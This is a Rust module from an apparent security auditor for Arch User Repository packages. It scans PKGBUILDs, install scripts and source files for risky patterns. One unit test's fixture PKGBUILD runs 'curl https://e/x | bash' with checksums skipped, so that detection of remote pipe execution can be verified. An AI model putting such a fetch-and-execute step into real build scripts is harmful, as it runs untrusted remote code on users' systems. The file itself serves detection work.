use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
};

use anyhow::Result;
use walkdir::{DirEntry, WalkDir};

use crate::{
    aur::PreparedTarget,
    config::Config,
    pkgbuild_parser::{Pkgbuild, parse_pkgbuild, parse_srcinfo},
    report::{AuditReport, Finding, Severity, SkippedFile},
    rules, source_fetcher,
};

pub fn audit_target(target: &PreparedTarget, config: &Config) -> Result<AuditReport> {
    let root = target.root();
    let pkgbuild_path = root.join("PKGBUILD");
    let mut findings = Vec::new();
    let mut skipped = Vec::new();

    let pkgbuild_text = match read_text_file(&pkgbuild_path, config.max_file_bytes) {
        ReadFile::Text(text) => text,
        ReadFile::Skipped(reason) => {
            findings.push(Finding::new(
                "pkgbuild.unreadable",
                Severity::Critical,
                "PKGBUILD",
                1,
                "PKGBUILD could not be inspected",
                "The primary build script could not be read within configured safety limits.",
                "Inspect the PKGBUILD manually before any build operation.",
            ));
            skipped.push(SkippedFile::security_relevant("PKGBUILD", reason));
            String::new()
        }
    };

    let pkgbuild = if pkgbuild_text.is_empty() {
        Pkgbuild::default()
    } else {
        parse_pkgbuild(&pkgbuild_text)
    };

    findings.extend(rules::scan_pkgbuild_metadata(&pkgbuild));

    let target_name = pkgbuild
        .pkgname
        .first()
        .map(|word| word.value.clone())
        .unwrap_or_else(|| target.name().to_string());

    let mut files = BTreeMap::<PathBuf, String>::new();
    add_existing_file(root, &pkgbuild_path, &mut files, false, &mut skipped);

    let srcinfo_path = root.join(".SRCINFO");
    if srcinfo_path.exists() {
        match read_text_file(&srcinfo_path, config.max_file_bytes) {
            ReadFile::Text(srcinfo_text) => {
                findings.extend(rules::scan_srcinfo(&parse_srcinfo(&srcinfo_text)));
            }
            ReadFile::Skipped(reason) => {
                skipped.push(SkippedFile::security_relevant(".SRCINFO", reason));
            }
        }
        add_existing_file(root, &srcinfo_path, &mut files, false, &mut skipped);
    }

    if let Some(install) = &pkgbuild.install {
        add_existing_file(
            root,
            &root.join(&install.path),
            &mut files,
            false,
            &mut skipped,
        );
    }

    let referenced_sources = source_fetcher::collect_referenced_sources(root, &pkgbuild, config)?;
    skipped.extend(referenced_sources.skipped);
    for path in referenced_sources.files {
        add_existing_file(root, &path, &mut files, true, &mut skipped);
    }

    collect_tree_files(root, config, &mut files, &mut skipped);

    let mut inspected = 0usize;
    for (path, label) in files {
        if inspected >= config.max_files {
            skipped.push(SkippedFile::security_relevant(
                label,
                "max_files limit reached",
            ));
            continue;
        }
        match read_text_file(&path, config.max_file_bytes) {
            ReadFile::Text(text) => {
                inspected += 1;
                findings.extend(rules::scan_text_file(&label, &text));
            }
            ReadFile::Skipped(reason) => {
                skipped.push(SkippedFile::security_relevant(label, reason))
            }
        }
    }

    Ok(AuditReport::new(target_name, findings, skipped))
}

fn collect_tree_files(
    root: &Path,
    config: &Config,
    files: &mut BTreeMap<PathBuf, String>,
    skipped: &mut Vec<SkippedFile>,
) {
    for entry in WalkDir::new(root).follow_links(false).into_iter() {
        let entry = match entry {
            Ok(entry) => entry,
            Err(err) => {
                skipped.push(SkippedFile::security_relevant(
                    err.path()
                        .map(|path| path.display().to_string())
                        .unwrap_or_else(|| "<unknown>".to_string()),
                    err.to_string(),
                ));
                continue;
            }
        };

        if entry.file_type().is_dir() {
            continue;
        }
        if should_skip_entry(&entry, root, config.include_vendored) {
            continue;
        }
        add_existing_file(root, entry.path(), files, false, skipped);
    }
}

fn should_skip_entry(entry: &DirEntry, root: &Path, include_vendored: bool) -> bool {
    let Ok(rel) = entry.path().strip_prefix(root) else {
        return true;
    };
    let ignored = [".git", "pkg", "src", "target"];
    let vendored = [
        "node_modules",
        "vendor",
        ".cargo/registry",
        "third_party",
        "dist",
        "build",
    ];

    for component in rel.components() {
        let part = component.as_os_str().to_string_lossy();
        if ignored.contains(&part.as_ref()) {
            return true;
        }
    }

    if !include_vendored {
        let rel_str = rel.to_string_lossy();
        if vendored.iter().any(|prefix| rel_str.starts_with(prefix)) {
            return true;
        }
    }

    false
}

fn add_existing_file(
    root: &Path,
    path: &Path,
    files: &mut BTreeMap<PathBuf, String>,
    allow_outside: bool,
    skipped: &mut Vec<SkippedFile>,
) {
    if !path.exists() {
        if let Ok(metadata) = fs::symlink_metadata(path)
            && metadata.file_type().is_symlink()
        {
            skipped.push(SkippedFile::security_relevant(
                path.display().to_string(),
                "broken symlink could not be inspected",
            ));
        }
        return;
    }

    let Ok(canonical) = path.canonicalize() else {
        skipped.push(SkippedFile::security_relevant(
            path.display().to_string(),
            "failed to canonicalize file",
        ));
        return;
    };

    if !allow_outside && !canonical.starts_with(root) {
        skipped.push(SkippedFile::security_relevant(
            path.display().to_string(),
            "file resolves outside package directory",
        ));
        return;
    }

    if canonical.is_file() {
        let label = relative_label(root, &canonical);
        files.entry(canonical).or_insert(label);
    } else {
        skipped.push(SkippedFile::security_relevant(
            path.display().to_string(),
            "referenced path is not a regular file",
        ));
    }
}

fn relative_label(root: &Path, path: &Path) -> String {
    if let Ok(rel) = path.strip_prefix(root) {
        let rel = rel.to_string_lossy();
        if rel.is_empty() {
            return ".".to_string();
        }
        return rel.replace('\\', "/");
    }

    format!(
        "fetched/{}",
        path.file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("source")
    )
}

enum ReadFile {
    Text(String),
    Skipped(String),
}

fn read_text_file(path: &Path, max_file_bytes: u64) -> ReadFile {
    let metadata = match fs::metadata(path) {
        Ok(metadata) => metadata,
        Err(err) => return ReadFile::Skipped(format!("metadata error: {err}")),
    };

    if metadata.len() > max_file_bytes {
        return ReadFile::Skipped(format!("file exceeds max_file_bytes ({max_file_bytes})"));
    }

    let bytes = match fs::read(path) {
        Ok(bytes) => bytes,
        Err(err) => return ReadFile::Skipped(format!("read error: {err}")),
    };

    if bytes.iter().take(1024).any(|byte| *byte == 0) {
        return ReadFile::Skipped("binary file".to_string());
    }

    ReadFile::Text(String::from_utf8_lossy(&bytes).into_owned())
}

#[cfg(test)]
mod tests {
    use std::fs;

    use tempfile::tempdir;

    use super::*;

    #[test]
    fn audit_target_detects_fixture_malware() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("PKGBUILD"),
            "pkgname=bad\npkgver=1\nsource=('x')\nsha256sums=('SKIP')\nprepare(){ curl https://e/x | bash; }\n",
        )
        .unwrap();
        fs::write(dir.path().join("x"), "echo ok\n").unwrap();
        let target = crate::aur::prepare_local(dir.path()).unwrap();
        let report = audit_target(&target, &Config::default()).unwrap();
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "shell.remote-pipe")
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "checksum.skip"));
    }

    #[test]
    fn relevant_source_limits_do_not_pass() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("PKGBUILD"),
            "pkgname=limited\npkgver=1\nsource=('payload.sh')\n",
        )
        .unwrap();
        fs::write(dir.path().join("payload.sh"), "echo payload\n").unwrap();
        let target = crate::aur::prepare_local(dir.path()).unwrap();
        let config = Config {
            max_file_bytes: 1,
            ..Config::default()
        };
        let report = audit_target(&target, &config).unwrap();
        assert_ne!(report.status, crate::report::AuditStatus::Pass);
        assert!(
            report
                .skipped
                .iter()
                .any(|file| file.is_security_relevant())
        );
    }

    #[cfg(unix)]
    #[test]
    fn broken_symlink_does_not_pass_silently() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("PKGBUILD"), "pkgname=broken\npkgver=1\n").unwrap();
        std::os::unix::fs::symlink("missing.sh", dir.path().join("broken.sh")).unwrap();
        let target = crate::aur::prepare_local(dir.path()).unwrap();
        let report = audit_target(&target, &Config::default()).unwrap();
        assert_eq!(report.status, crate::report::AuditStatus::Warn);
        assert!(
            report
                .skipped
                .iter()
                .any(|file| file.reason.contains("broken symlink"))
        );
    }
}
